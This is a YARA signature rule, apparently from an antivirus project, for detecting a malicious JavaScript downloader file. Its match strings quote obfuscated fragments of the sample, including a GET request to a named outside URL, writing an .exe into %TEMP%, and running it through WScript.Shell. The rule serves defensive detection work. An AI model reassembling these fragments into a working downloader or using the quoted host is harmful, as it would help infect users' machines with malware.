rule sig_20160328_2d29615220891ed018610f2dffd3551c {
  meta:
    description = "datamaliciousorder - file 20160328_2d29615220891ed018610f2dffd3551c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "70ec8f144cdc181f173e3565dadd34321ccc97c76c14a9745b8fcf752bbf8b5f"

  strings:
    $s1  = "function Azecpy() {return Eeyywqxa[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"RynAajr6xxIK.exe\";};" fullword ascii
    $s2  = "do {WScript[Rtepkt](Bkmpz() * 11)} while (Qykjyz[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Eeyywqxa = function Vetvjast() {return WScript[Gtqswxik](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Szwaxjh(Knjeyc, Gyyfyk){return Knjeyc - Gyyfyk;};" fullword ascii
    $s5  = "Qykjyz[Jhlfbxmk](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s6  = "var Hfyjearz = Whoop[\"getUTCMilliseconds\"]();" fullword ascii
    $s7  = "var Plgwbbkn = Whoop[\"getUTCMilliseconds\"]();" fullword ascii
    $s8  = "var Lzikxzg = Whoop[\"getUTCMilliseconds\"]();" fullword ascii
    $s9  = "function Arair() {return ((Jrxhecnk == true) && (Jrxhecnk == Vynecc)) ? 1 : Dyujifws;};" fullword ascii
    $s10 = "function Shzvrcpi(Uwvgzfpfy){Eeyywqxa[\"Run\"](Uwvgzfpfy, Dyujifws, Dyujifws);};" fullword ascii
    $s11 = " while (Ntmhsk){" fullword ascii
    $s12 = "var Jrxhecnk = false;" fullword ascii
    $s13 = "var Vynecc = false;" fullword ascii
    $s14 = "Vynecc = true; " fullword ascii
    $s15 = "function Ocgsoktotf(){return Onicfadod;};" fullword ascii
    $s16 = "function Hzatqoijpo(Ogniag) {var Rkzloyhqa = (1, 2, 3, 4, 5, Ogniag); return Rkzloyhqa;};" fullword ascii
    $s17 = "var Gibpoktid = false;" fullword ascii
    $s18 = "Jrxhecnk = true; " fullword ascii
    $s19 = "return Szwaxjh(Kzrzd, Ainsmyusc);" fullword ascii
    $s20 = "function Bkmpz(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}